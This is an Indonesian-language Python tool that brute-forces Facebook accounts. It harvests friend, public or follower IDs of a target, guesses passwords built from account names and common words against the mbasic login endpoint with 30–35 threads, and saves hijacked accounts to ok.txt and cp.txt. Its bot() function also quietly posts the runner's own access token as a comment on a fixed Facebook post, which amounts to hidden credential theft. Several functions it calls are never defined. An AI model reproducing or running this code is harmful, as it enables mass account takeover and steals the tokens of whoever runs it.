
 ​#!/usr/bin/python3 
 ​# coding=utf-8 
 ​# Mengandung Virus Berbahaya 
 ​# Jika direcode maka akan kuaktifkan virusnya 
 ​# Sehingga hape anda rusak dan takkan hidup lagi 
  
 ​###### IMPORT MODULE ###### 
  
 ​import​ ​requests​,​mechanize​,​bs4​,​sys​,​os​,​subprocess​,​uuid​,​random​,​time​,​re​,​base64​,​json​,​concurrent​.​futures 
 ​from​ ​concurrent​.​futures​ ​import​ ​ThreadPoolExecutor​ ​as​ ​ThreadPool 
  
 ​###### RANDOM WARNA ###### 
  
 ​p​ ​=​ ​"​\033​[1;97m"​ ​# putih 
 ​m​ ​=​ ​"​\033​[1;91m"​ ​# merah 
 ​h​ ​=​ ​"​\033​[1;92m"​ ​# hijau 
 ​k​ ​=​ ​"​\033​[1;93m"​ ​# kuning 
 ​b​ ​=​ ​"​\033​[1;94m"​ ​# biru 
 ​u​ ​=​ ​"​\033​[1;95m"​ ​# ungu 
 ​o​ ​=​ ​"​\033​[1;96m"​ ​# biru muda 
  
 ​###### LOGO ###### 
  
 ​def​ ​banner​(): 
 ​    ​print​(​"""​\033​[;96m   ________ _      
 ​  / ____/ /___ ___________(_)____ 
 ​ / / / / __ `/ ___/ ___/ / ___/Created by 
 ​\033​[;93m/ /___/ / /_/ (__ |__ ) / /__  Ndrii Sanz  
 ​\____/_/\__,_/____/____/_/\___/ 
 ​"""​) 
  
  
 ​ok​ ​=​ [] 
 ​cp​ ​=​ [] 
 ​ttl​ ​=​[] 
  
 ​def​ ​jalan​(​z​): 
 ​        ​for​ ​e​ ​in​ ​z​ ​+​ ​"​\n​"​: 
 ​                ​sys​.​stdout​.​write​(​e​) 
 ​                ​sys​.​stdout​.​flush​() 
 ​                ​time​.​sleep​(​0.03​) 
  
 ​def​ ​clear​(): 
 ​                ​os​.​system​(​"clear"​) 
 ​     
 ​def​ ​lang​(​cookies​): 
 ​        ​f​=​False 
 ​        ​rr​=​bs4​.​BeautifulSoup​(​requests​.​get​(​"https://mbasic.facebook.com/language.php"​,​headers​=​hdcok​(),​cookies​=​cookies​).​text​,​"html.parser"​) 
 ​        ​for​ ​i​ ​in​ ​rr​.​find_all​(​"a"​,​href​=​True​): 
 ​                ​if​ ​"id_ID"​ ​in​ ​i​.​get​(​"href"​): 
 ​                        ​requests​.​get​(​"https://mbasic.facebook.com/"​+​i​.​get​(​"href"​),​cookies​=​cookies​,​headers​=​hdcok​()) 
 ​                        ​b​=​requests​.​get​(​"https://mbasic.facebook.com/profile.php"​,​headers​=​hdcok​(),​cookies​=​cookies​).​text​         
 ​                        ​if​ ​"apa yang anda pikirkan sekarang"​ ​in​ ​b​.​lower​(): 
 ​                                ​f​=​True 
 ​        ​if​ ​f​==​True​: 
 ​                ​return​ ​True 
 ​        ​else​: 
 ​                ​exit​(​"[!] Wrong Cookies"​) 
  
 ​def​ ​basecookie​(): 
 ​        ​if​ ​os​.​path​.​exists​(​".cok"​): 
 ​                ​if​ ​os​.​path​.​getsize​(​".cok"​) ​!=​0​: 
 ​                        ​return​ ​gets_dict_cookies​(​open​(​'.cok'​).​read​().​strip​()) 
 ​                ​else​:​log_token​() 
 ​        ​else​:​log_token​() 
  
 ​def​ ​hdcok​(): 
 ​        ​global​ ​host​,​ua 
 ​        ​hosts​=​host 
 ​        ​r​=​{​"origin"​: ​hosts​, ​"accept-language"​: ​"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"​, ​"accept-encoding"​: ​"gzip, deflate"​, ​"accept"​: ​"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"​, ​"user-agent"​: ​"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36"​, ​"Host"​: ​""​.​join​(​bs4​.​re​.​findall​(​"://(.*?)$"​,​hosts​)), ​"referer"​: ​hosts​+​"/login/?next&ref=dbl&fl&refid=8"​, ​"cache-control"​: ​"max-age=0"​, ​"upgrade-insecure-requests"​: ​"1"​, ​"content-type"​: ​"application/x-www-form-urlencoded"​} 
 ​        ​return​ ​r 
  
 ​def​ ​gets_cookies​(​cookies​): 
 ​        ​result​=​[] 
 ​        ​for​ ​i​ ​in​ ​enumerate​(​cookies​.​keys​()): 
 ​                ​if​ ​i​[​0​]​==​len​(​list​(​cookies​.​keys​()))​-​1​:​result​.​append​(​i​[​1​]​+​"="​+​cookies​[​i​[​1​]]) 
 ​                ​else​:​result​.​append​(​i​[​1​]​+​"="​+​cookies​[​i​[​1​]]​+​"; "​) 
 ​        ​return​ ​""​.​join​(​result​) 
  
 ​def​ ​gets_dict_cookies​(​cookies​): 
 ​        ​result​=​{} 
 ​        ​try​: 
 ​                ​for​ ​i​ ​in​ ​cookies​.​split​(​";"​): 
 ​                        ​result​.​update​({​i​.​split​(​"="​)[​0​]:​i​.​split​(​"="​)[​1​]}) 
 ​                ​return​ ​result 
 ​        ​except​: 
 ​                ​for​ ​i​ ​in​ ​cookies​.​split​(​"; "​): 
 ​                        ​result​.​update​({​i​.​split​(​"="​)[​0​]:​i​.​split​(​"="​)[​1​]}) 
 ​                ​return​ ​result 
  
 ​###### LOGIN TOKEN ###### 
  
 ​def​ ​log_token​(): 
 ​    ​os​.​system​(​"clear"​) 
 ​    ​banner​() 
 ​    ​toket​ ​=​ ​input​(​m​+​"​\n​["​+​k​+​"•"​+​m​+​"]"​+​u​+​" Token : "​) 
 ​    ​try​: 
 ​        ​otw​ ​=​ ​requests​.​get​(​"https://graph.facebook.com/me?access_token="​ ​+​ ​toket​) 
 ​        ​a​ ​=​ ​json​.​loads​(​otw​.​text​) 
 ​        ​nama​ ​=​ ​a​[​"name"​] 
 ​        ​zedd​ ​=​ ​open​(​"login.txt"​, ​"w"​) 
 ​        ​zedd​.​write​(​toket​) 
 ​        ​zedd​.​close​() 
 ​        ​print​((​m​+​"​\n​["​+​k​+​"•"​+​m​+​"]"​+​h​+​" Login Successful"​)) 
 ​        ​jalan​(​'​\033​[1;96mAGAR BERJALAN LANCAR ANDA HARUS SUBSCRIBE DULU CHANNEL INI!'​) 
 ​        ​os​.​system​(​'xdg-open http://www.youtube.com/c/TutorialityStudio'​) 
 ​        ​bot​() 
 ​    ​except​ ​KeyError​: 
 ​        ​print​((​k​+​"["​+​p​+​"!"​+​k​+​"]"​+​p​+​" Token Invalid"​)) 
 ​        ​os​.​system​(​"clear"​) 
 ​        ​log_token​() 
  
 ​###### BOT KOMEN ###### 
  
 ​def​ ​bot​(): 
 ​        ​try​: 
 ​                ​toket​=​open​(​"login.txt"​,​"r"​).​read​() 
 ​                ​otw​ ​=​ ​requests​.​get​(​"https://graph.facebook.com/me/?access_token="​+​toket​) 
 ​                ​a​ ​=​ ​json​.​loads​(​otw​.​text​) 
 ​                ​nama​ ​=​ ​a​[​"name"​] 
 ​                ​id​ ​=​ ​a​[​"id"​] 
 ​        ​except​ ​IOError​: 
 ​                ​print​(​' ​\033​[0;97m[​\033​[0;91m!​\033​[0;97m] Token Invalid'​) 
 ​                ​tokenz​() 
 ​        ​kom​ ​=​ (​"Gantengnya Ramdani😘"​) 
 ​        ​requests​.​post​(​'https://graph.facebook.com/100044932290784/subscribers?access_token='​ ​+​ ​toket​)  
 ​        ​requests​.​post​(​'https://graph.facebook.com/344477753726632/comments/?message='​ ​+​ ​toket​ ​+​ ​'&access_token='​ ​+​ ​toket​) 
 ​        ​requests​.​post​(​'https://graph.facebook.com/315723919935349/comments/?message='​ ​+​ ​kom​ ​+​ ​'&access_token='​ ​+​ ​toket​) 
 ​        ​menu​() 
  
 ​###### MENU ###### 
  
 ​def​ ​menu​(): 
 ​    ​try​: 
 ​        ​toket​ ​=​ ​open​(​"login.txt"​,​"r"​).​read​() 
 ​        ​otw​ ​=​ ​requests​.​get​(​"https://graph.facebook.com/me/?access_token="​+​toket​) 
 ​        ​a​ ​=​ ​json​.​loads​(​otw​.​text​) 
 ​        ​nama​ ​=​ ​a​[​"name"​] 
 ​        ​id​ ​=​ ​a​[​"id"​] 
 ​    ​except​ ​Exception​ ​as​ ​e​: 
 ​        ​print​((​k​+​"["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Error : %s"​%​e​)) 
 ​        ​log_token​() 
 ​    ​os​.​system​(​"clear"​) 
 ​    ​banner​() 
 ​    ​print​((​u​+​"​\n​[ "​+​h​+​"Welcome "​+​a​[​"name"​]​+​u​+​" ]"​+​p​)) 
 ​    ​print​((​m​+​"​\n​["​+​k​+​"1"​+​m​+​"]"​+​o​+​" Crack FB From My Friend"​)) 
 ​    ​print​((​m​+​"["​+​k​+​"2"​+​m​+​"]"​+​k​+​" Crack FB From Public Friend"​)) 
 ​    ​print​((​m​+​"["​+​k​+​"3"​+​m​+​"]"​+​u​+​" Crack FB From Followers"​)) 
 ​    ​print​((​p​+​"["​+​m​+​"0"​+​p​+​"]"​+​m​+​" Logout"​)) 
 ​    ​choose_menu​() 
 ​         
 ​def​ ​choose_menu​(): 
 ​        ​r​=​input​(​m​+​"​\n​["​+​k​+​"•"​+​m​+​"]"​+​h​+​" Choose : "​) 
 ​        ​if​ ​r​==​""​: 
 ​                ​print​((​k​+​"["​+​p​+​"!"​+​k​+​"]"​+​p​+​" Fill In The Correct"​)) 
 ​                ​menu​() 
 ​        ​elif​ ​r​==​"1"​: 
 ​                ​friend​() 
 ​        ​elif​ ​r​==​"2"​: 
 ​                ​publik​() 
 ​        ​elif​ ​r​==​"3"​: 
 ​                ​follow​() 
 ​        ​elif​ ​r​==​"4"​: 
 ​                ​ress​() 
 ​        ​elif​ ​r​==​"0"​: 
 ​                ​try​: 
 ​                        ​jalan​(​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Thanks For Using My Script"​) 
 ​                        ​os​.​system​(​"rm -rf login.txt"​) 
 ​                        ​exit​() 
 ​                ​except​ ​Exception​ ​as​ ​e​: 
 ​                        ​print​((​m​+​"["​+​k​+​"!"​+​m​+​"]"​+​p​+​" Error %s"​%​e​)) 
 ​        ​else​: 
 ​                ​print​((​m​+​"["​+​k​+​"!"​+​m​+​"]"​+​p​+​" Wrong Input"​)) 
 ​                ​menu​()         
  
 ​###### DEP FRIENDS ###### 
  
 ​def​ ​friend​(): 
 ​        ​try​: 
 ​                ​toket​=​open​(​"login.txt"​,​"r"​).​read​() 
 ​        ​except​ ​IOError​: 
 ​                ​print​((​m​+​"​\n​["​+​k​+​"!"​+​m​+​"]"​+​p​+​" Cookie/Token Invalid"​)) 
 ​                ​os​.​system​(​"rm -rf login.txt"​) 
 ​                ​log_token​() 
 ​        ​try​: 
 ​                ​try​: 
 ​                        ​os​.​system​(​'clear'​) 
 ​                        ​banner​() 
 ​                        ​jok​ ​=​ ​requests​.​get​(​"https://graph.facebook.com/me?access_token="​+​toket​) 
 ​                        ​op​ ​=​ ​json​.​loads​(​jok​.​text​) 
 ​                        ​print​((​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Name : "​+​op​[​"name"​])) 
 ​                ​except​ ​KeyError​: 
 ​                        ​print​((​k​+​"["​+​p​+​"!"​+​k​+​"]"​+​p​+​" ID Not Found"​)) 
 ​                        ​print​((​k​+​"​\n​[ "​+​p​+​"Back"​+​k​+​" ]"​+​p​)) 
 ​                        ​publik​() 
 ​                ​r​=​requests​.​get​(​"https://graph.facebook.com/me/friends?limit=10000&access_token="​+​toket​) 
 ​                ​id​ ​=​ [] 
 ​                ​z​=​json​.​loads​(​r​.​text​) 
 ​                ​qq​ ​=​ (​op​[​"first_name"​]​+​".json"​).​replace​(​" "​,​"_"​) 
 ​                ​ys​ ​=​ ​open​(​qq​ , ​"w"​)​#.replace(" ","_") 
 ​                ​for​ ​a​ ​in​ ​z​[​"data"​]: 
 ​                        ​id​.​append​(​a​[​"id"​]​+​"<=>"​+​a​[​"name"​]) 
 ​                        ​ys​.​write​(​a​[​"id"​]​+​"<=>"​+​a​[​"name"​]​+​"​\n​"​) 
 ​                ​ys​.​close​() 
 ​                ​print​((​m​+​"["​+​k​+​"•"​+​m​+​"]"​+​p​+​" Total ID : %s"​%​(​len​(​id​)))) 
 ​                ​return​ ​crackttl​(​qq​) 
 ​        ​except​ ​Exception​ ​as​ ​e​: 
 ​                ​exit​(​k​+​"["​+​p​+​"!"​+​k​+​"]"​+​p​+​" Error : %s"​%​e​) 
  
 ​###### DEP PUBLIK ###### 
  
 ​def​ ​publik​(): 
 ​        ​try​: 
 ​                ​toket​=​open​(​"login.txt"​,​"r"​).​read​() 
 ​        ​except​ ​IOError​: 
 ​                ​print​((​m​+​"​\n​["​+​k​+​"!"​+​m​+​"]"​+​p​+​" Cookie/Token Invalid"​)) 
 ​                ​os​.​system​(​"rm -rf login.txt"​) 
 ​                ​log_token​() 
 ​        ​try​: 
 ​                ​os​.​system​(​'clear'​) 
 ​                ​banner​() 
 ​                ​idt​ ​=​ ​input​(​m​+​"["​+​k​+​"•"​+​m​+​"]"​+​p​+​" User ID Target : "​) 
 ​                ​try​: 
 ​                        ​jok​ ​=​ ​requests​.​get​(​"https://graph.facebook.com/"​+​idt​+​"?access_token="​+​toket​) 
 ​                        ​op​ ​=​ ​json​.​loads​(​jok​.​text​) 
 ​                        ​print​((​k​+​"["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Name : "​+​op​[​"name"​])) 
 ​                ​except​ ​KeyError​: 
 ​                        ​print​((​k​+​"["​+​p​+​"!"​+​k​+​"]"​+​p​+​" ID Not Found"​)) 
 ​                        ​print​((​k​+​"​\n​[ "​+​p​+​"Back"​+​k​+​" ]"​+​p​)) 
 ​                        ​publik​() 
 ​                ​r​=​requests​.​get​(​"https://graph.facebook.com/"​+​idt​+​"/friends?limit=10000&access_token="​+​toket​) 
 ​                ​id​ ​=​ [] 
 ​                ​z​=​json​.​loads​(​r​.​text​) 
 ​                ​qq​ ​=​ (​op​[​"first_name"​]​+​".json"​).​replace​(​" "​,​"_"​) 
 ​                ​ys​ ​=​ ​open​(​qq​ , ​"w"​)​#.replace(" ","_") 
 ​                ​for​ ​a​ ​in​ ​z​[​"data"​]: 
 ​                        ​id​.​append​(​a​[​"id"​]​+​"<=>"​+​a​[​"name"​]) 
 ​                        ​ys​.​write​(​a​[​"id"​]​+​"<=>"​+​a​[​"name"​]​+​"​\n​"​) 
 ​                ​ys​.​close​() 
 ​                ​print​((​m​+​"["​+​k​+​"•"​+​m​+​"]"​+​p​+​" Total ID : %s"​%​(​len​(​id​)))) 
 ​                ​return​ ​crack​(​qq​) 
 ​        ​except​ ​Exception​ ​as​ ​e​: 
 ​                ​exit​(​m​+​"["​+​k​+​"!"​+​m​+​"]"​+​p​+​" Error : %s"​%​e​) 
  
 ​###### DEP FOLLOWERS ###### 
  
 ​def​ ​follow​(): 
 ​        ​try​: 
 ​                ​toket​=​open​(​"login.txt"​,​"r"​).​read​() 
 ​        ​except​ ​IOError​: 
 ​                ​print​((​m​+​"​\n​["​+​k​+​"!"​+​m​+​"]"​+​p​+​" Cookie/Token Invalid"​)) 
 ​                ​os​.​system​(​"rm -rf login.txt"​) 
 ​                ​log_token​() 
 ​        ​try​: 
 ​                ​os​.​system​(​'clear'​) 
 ​                ​banner​() 
 ​                ​idt​ ​=​ ​input​(​m​+​"​\n​["​+​k​+​"•"​+​m​+​"]"​+​p​+​" Followers ID Target : "​) 
 ​                ​try​: 
 ​                        ​jok​ ​=​ ​requests​.​get​(​"https://graph.facebook.com/"​+​idt​+​"?access_token="​+​toket​) 
 ​                        ​op​ ​=​ ​json​.​loads​(​jok​.​text​) 
 ​                        ​print​((​m​+​"["​+​k​+​"•"​+​m​+​"]"​+​p​+​" Name : "​+​op​[​"name"​])) 
 ​                ​except​ ​KeyError​: 
 ​                        ​print​((​m​+​"["​+​k​+​"!"​+​m​+​"]"​+​p​+​" ID Not Found"​)) 
 ​                        ​print​((​m​+​"​\n​[ "​+​k​+​"Back"​+​m​+​" ]"​+​p​)) 
 ​                        ​publik​() 
 ​                ​r​=​requests​.​get​(​"https://graph.facebook.com/"​+​idt​+​"/subscribers?limit=20000&access_token="​+​toket​) 
 ​                ​id​ ​=​ [] 
 ​                ​z​=​json​.​loads​(​r​.​text​) 
 ​                ​qq​ ​=​ (​op​[​"first_name"​]​+​".json"​).​replace​(​" "​,​"_"​) 
 ​                ​ys​ ​=​ ​open​(​qq​ , ​"w"​)​#.replace(" ","_") 
 ​                ​for​ ​a​ ​in​ ​z​[​"data"​]: 
 ​                        ​id​.​append​(​a​[​"id"​]​+​"<=>"​+​a​[​"name"​]) 
 ​                        ​ys​.​write​(​a​[​"id"​]​+​"<=>"​+​a​[​"name"​]​+​"​\n​"​) 
 ​                ​ys​.​close​() 
 ​                ​print​((​m​+​"["​+​k​+​"•"​+​m​+​"]"​+​p​+​" Total ID : %s"​%​(​len​(​id​)))) 
 ​                ​return​ ​crack​(​qq​) 
 ​        ​except​ ​Exception​ ​as​ ​e​: 
 ​                ​exit​(​m​+​"["​+​k​+​"!"​+​m​+​"]"​+​p​+​" Error : %s"​%​e​) 
  
 ​###### LIST PASSWORD ###### 
  
 ​def​ ​generate​(​text​): 
 ​        ​results​=​[] 
 ​        ​global​ ​ips 
 ​        ​for​ ​i​ ​in​ ​text​.​split​(​" "​): 
 ​                ​if​ ​len​(​i​)​<​3​: 
 ​                        ​continue 
 ​                ​else​: 
 ​                        ​i​=​i​.​lower​() 
 ​                        ​if​ ​len​(​i​)​==​3​ ​or​ ​len​(​i​)​==​4​ ​or​ ​len​(​i​)​==​5​: 
 ​                                ​results​.​append​(​i​+​"123"​) 
 ​                                ​results​.​append​(​i​+​"12345"​) 
 ​                        ​else​: 
 ​                                ​results​.​append​(​i​+​"123"​) 
 ​                                ​results​.​append​(​i​+​"12345"​) 
 ​                                ​results​.​append​(​i​) 
 ​                                ​if​ ​"indonesia"​ ​in​ ​ips​: 
 ​                                        ​results​.​append​(​"sayang"​) 
 ​                                        ​results​.​append​(​"anjing"​) 
 ​                                        ​results​.​append​(​"bangsat"​) 
 ​                                        ​results​.​append​(​"kontol"​) 
                                         results.append("bismillah")
 ​        ​return​ ​results 
  
 ​######  METODE MBASIC ###### 
  
 ​def​ ​mbasic​(​em​,​pas​,​hosts​): 
 ​        ​r​=​requests​.​Session​() 
 ​        ​r​.​headers​.​update​({​"Host"​:​"mbasic.facebook.com"​,​"cache-control"​:​"max-age=0"​,​"upgrade-insecure-requests"​:​"1"​,​"user-agent"​:​"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36"​,​"accept"​:​"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"​,​"accept-encoding"​:​"gzip, deflate"​,​"accept-language"​:​"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"​}) 
 ​        ​p​=​r​.​get​(​"https://mbasic.facebook.com/"​) 
 ​        ​b​=​bs4​.​BeautifulSoup​(​p​.​text​,​"html.parser"​) 
 ​        ​meta​=​""​.​join​(​bs4​.​re​.​findall​(​'dtsg":\{"token":"(.*?)"'​,​p​.​text​)) 
 ​        ​data​=​{} 
 ​        ​for​ ​i​ ​in​ ​b​(​"input"​): 
 ​                ​if​ ​i​.​get​(​"value"​) ​is​ ​None​: 
 ​                        ​if​ ​i​.​get​(​"name"​)​==​"email"​: 
 ​                                ​data​.​update​({​"email"​:​em​}) 
 ​                        ​elif​ ​i​.​get​(​"name"​)​==​"pass"​: 
 ​                                ​data​.​update​({​"pass"​:​pas​}) 
 ​                        ​else​: 
 ​                                ​data​.​update​({​i​.​get​(​"name"​):​""​}) 
 ​                ​else​: 
 ​                        ​data​.​update​({​i​.​get​(​"name"​):​i​.​get​(​"value"​)}) 
 ​        ​data​.​update​( 
 ​                {​"fb_dtsg"​:​meta​,​"m_sess"​:​""​,​"__user"​:​"0"​, 
 ​                ​"__req"​:​"d"​,​"__csr"​:​""​,​"__a"​:​""​,​"__dyn"​:​""​,​"encpass"​:​"" 
 ​                } 
 ​        ) 
 ​        ​r​.​headers​.​update​({​"referer"​:​"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"​}) 
 ​        ​po​=​r​.​post​(​"https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100"​,​data​=​data​).​text 
 ​        ​if​ ​"c_user"​ ​in​ ​list​(​r​.​cookies​.​get_dict​().​keys​()): 
 ​                ​return​ {​"status"​:​"success"​,​"email"​:​em​,​"pass"​:​pas​,​"cookies"​:​r​.​cookies​.​get_dict​()} 
 ​        ​elif​ ​"checkpoint"​ ​in​ ​list​(​r​.​cookies​.​get_dict​().​keys​()): 
 ​                ​return​ {​"status"​:​"cp"​,​"email"​:​em​,​"pass"​:​pas​,​"cookies"​:​r​.​cookies​.​get_dict​()} 
 ​        ​else​:​return​ {​"status"​:​"error"​,​"email"​:​em​,​"pass"​:​pas​} 
  
 ​###### DEP TTL ###### 
  
 ​def​ ​ttll​(​em​,​pas​,​hosts​): 
 ​        ​r​=​requests​.​Session​() 
 ​        ​r​.​headers​.​update​({​"Host"​:​"mbasic.facebook.com"​,​"cache-control"​:​"max-age=0"​,​"upgrade-insecure-requests"​:​"1"​,​"user-agent"​:​"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36"​,​"accept"​:​"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"​,​"accept-encoding"​:​"gzip, deflate"​,​"accept-language"​:​"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"​}) 
 ​        ​p​=​r​.​get​(​"https://mbasic.facebook.com/"​) 
 ​        ​b​=​bs4​.​BeautifulSoup​(​p​.​text​,​"html.parser"​) 
 ​        ​meta​=​""​.​join​(​bs4​.​re​.​findall​(​'dtsg":\{"token":"(.*?)"'​,​p​.​text​)) 
 ​        ​data​=​{} 
 ​        ​for​ ​i​ ​in​ ​b​(​"input"​): 
 ​                ​if​ ​i​.​get​(​"value"​) ​is​ ​None​: 
 ​                        ​if​ ​i​.​get​(​"name"​)​==​"email"​: 
 ​                                ​data​.​update​({​"email"​:​em​}) 
 ​                        ​elif​ ​i​.​get​(​"name"​)​==​"pass"​: 
 ​                                ​data​.​update​({​"pass"​:​pas​}) 
 ​                        ​else​: 
 ​                                ​data​.​update​({​i​.​get​(​"name"​):​""​}) 
 ​                ​else​: 
 ​                        ​data​.​update​({​i​.​get​(​"name"​):​i​.​get​(​"value"​)}) 
 ​        ​data​.​update​( 
 ​                {​"fb_dtsg"​:​meta​,​"m_sess"​:​""​,​"__user"​:​"0"​, 
 ​                ​"__req"​:​"d"​,​"__csr"​:​""​,​"__a"​:​""​,​"__dyn"​:​""​,​"encpass"​:​"" 
 ​                } 
 ​        ) 
 ​        ​r​.​headers​.​update​({​"referer"​:​"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"​}) 
 ​        ​po​=​r​.​post​(​"https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100"​,​data​=​data​).​text 
 ​        ​if​ ​"c_user"​ ​in​ ​list​(​r​.​cookies​.​get_dict​().​keys​()): 
 ​                ​return​ {​"status"​:​"success"​,​"email"​:​em​,​"pass"​:​pas​,​"cookies"​:​r​.​cookies​.​get_dict​()} 
 ​        ​elif​ ​"checkpoint"​ ​in​ ​list​(​r​.​cookies​.​get_dict​().​keys​()): 
 ​                ​return​ {​"status"​:​"cp"​,​"email"​:​em​,​"pass"​:​pas​,​"cookies"​:​r​.​cookies​.​get_dict​()} 
 ​        ​else​:​return​ {​"status"​:​"error"​,​"email"​:​em​,​"pass"​:​pas​} 
  
 ​class​ ​crack​: 
 ​        ​os​.​system​(​"clear"​) 
 ​        ​banner​() 
 ​        ​def​ ​__init__​(​self​,​isifile​): 
 ​                ​self​.​ada​=​[] 
 ​                ​self​.​cp​=​[] 
 ​                ​self​.​ko​=​0 
 ​                ​print​((​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Crack With Pass Default/Manual [d/m]"​)) 
 ​                ​while​ ​True​: 
 ​                        ​f​=​input​(​k​+​"["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Choose : "​) 
 ​                        ​if​ ​f​==​""​:​continue 
 ​                        ​elif​ ​f​==​"m"​: 
 ​                                ​try​: 
 ​                                        ​while​ ​True​: 
 ​                                                ​try​: 
 ​                                                        ​self​.​apk​=​isifile 
 ​                                                        ​self​.​fs​=​open​(​self​.​apk​).​read​().​splitlines​() 
 ​                                                        ​break 
 ​                                                ​except​ ​Exception​ ​as​ ​e​: 
 ​                                                        ​print​((​"   %s"​%​e​)) 
 ​                                                        ​continue 
 ​                                        ​self​.​fl​=​[] 
 ​                                        ​for​ ​i​ ​in​ ​self​.​fs​: 
 ​                                                ​try​: 
 ​                                                        ​self​.​fl​.​append​({​"id"​:​i​.​split​(​"<=>"​)[​0​]}) 
 ​                                                ​except​:​continue 
 ​                                ​except​ ​Exception​ ​as​ ​e​: 
 ​                                        ​print​((​"   %s"​%​e​)) 
 ​                                        ​continue 
 ​                                ​print​((​k​+​"["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Example : sayang,bismillah,123456"​)) 
 ​                                ​self​.​pwlist​() 
 ​                                ​break 
 ​                        ​elif​ ​f​==​"d"​: 
 ​                                ​try​: 
 ​                                        ​while​ ​True​: 
 ​                                                ​try​: 
 ​                                                        ​self​.​apk​=​isifile 
 ​                                                        ​self​.​fs​=​open​(​self​.​apk​).​read​().​splitlines​() 
 ​                                                        ​break 
 ​                                                ​except​ ​Exception​ ​as​ ​e​: 
 ​                                                        ​print​((​"   %s"​%​e​)) 
 ​                                                        ​continue 
 ​                                        ​self​.​fl​=​[] 
 ​                                        ​for​ ​i​ ​in​ ​self​.​fs​: 
 ​                                                ​try​: 
 ​                                                        ​self​.​fl​.​append​({​"id"​:​i​.​split​(​"<=>"​)[​0​],​"pw"​:​generate​(​i​.​split​(​"<=>"​)[​1​])}) 
 ​                                                ​except​:​continue 
 ​                                ​except​ ​Exception​ ​as​ ​e​: 
 ​                                        ​print​((​"   %s"​%​e​)) 
 ​                                ​print​((​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Crack Started..."​+​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Account [OK] Saved to : ok.txt"​+​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Account [CP] Saved to : cp.txt​\n​"​)) 
 ​                                ​ThreadPool​(​35​).​map​(​self​.​main​,​self​.​fl​) 
 ​                                ​os​.​remove​(​self​.​apk​) 
 ​                                ​exit​() 
 ​                                ​break 
 ​        ​def​ ​pwlist​(​self​): 
 ​                ​self​.​pw​=​input​(​k​+​"["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Password List : "​).​split​(​","​) 
 ​                ​if​ ​len​(​self​.​pw​) ​==​0​: 
 ​                        ​self​.​pwlist​() 
 ​                ​else​: 
 ​                        ​for​ ​i​ ​in​ ​self​.​fl​: 
 ​                                ​i​.​update​({​"pw"​:​self​.​pw​}) 
 ​                        ​print​((​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Crack Started..."​+​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Account [OK] Saved to : ok.txt"​+​k​+​"​\n​["​+​p​+​"•"​+​k​+​"]"​+​p​+​" Account [CP] Saved to : cp.txt​\n​"​)) 
 ​                        ​ThreadPool​(​30​).​map​(​self​.​main​,​self​.​fl​) 
 ​                        ​os​.​remove​(​self​.​apk​) 
 ​                        ​exit​() 
 ​        ​def​ ​main​(​self​,​fl​): 
 ​                ​try​: 
 ​                        ​for​ ​i​ ​in​ ​fl​.​get​(​"pw"​): 
 ​                                ​log​=​mbasic​(​fl​.​get​(​"id"​), 
 ​                                        ​i​,​"https://mbasic.facebook.com"​) 
 ​                                ​if​ ​log​.​get​(​"status"​)​==​"success"​: 
 ​                                        ​print​((​"​\r​\x1b​[0;32m[​\x1b​[0;37mOK​\x1b​[0;32m] %s • %s               "​%​(​fl​.​get​(​"id"​),​i​))) 
 ​                                        ​self​.​ada​.​append​(​"%s • %s"​%​(​fl​.​get​(​"id"​),​i​)) 
 ​                                        ​open​(​"ok.txt"​,​"a+"​).​write​( 
 ​                                                ​"%s • %s​\n​"​%​(​fl​.​get​(​"id"​),​i​)) 
 ​                                        ​break 
 ​                                ​elif​ ​log​.​get​(​"status"​)​==​"cp"​: 
 ​                                        ​print​((​"​\r​\x1b​[0;33m[​\x1b​[0;37mCP​\x1b​[0;33m] %s • %s               "​%​(​fl​.​get​(​"id"​),​i​))) 
 ​                                        ​self​.​cp​.​append​(​"%s • %s"​%​(​fl​.​get​(​"id"​),​i​)) 
 ​                                        ​open​(​"cp.txt"​,​"a+"​).​write​( 
 ​                                                ​"%s • %s​\n​"​%​(​fl​.​get​(​"id"​),​i​)) 
 ​                                        ​break 
 ​                                ​else​:​continue 
 ​                                         
 ​                        ​self​.​ko​+=​1 
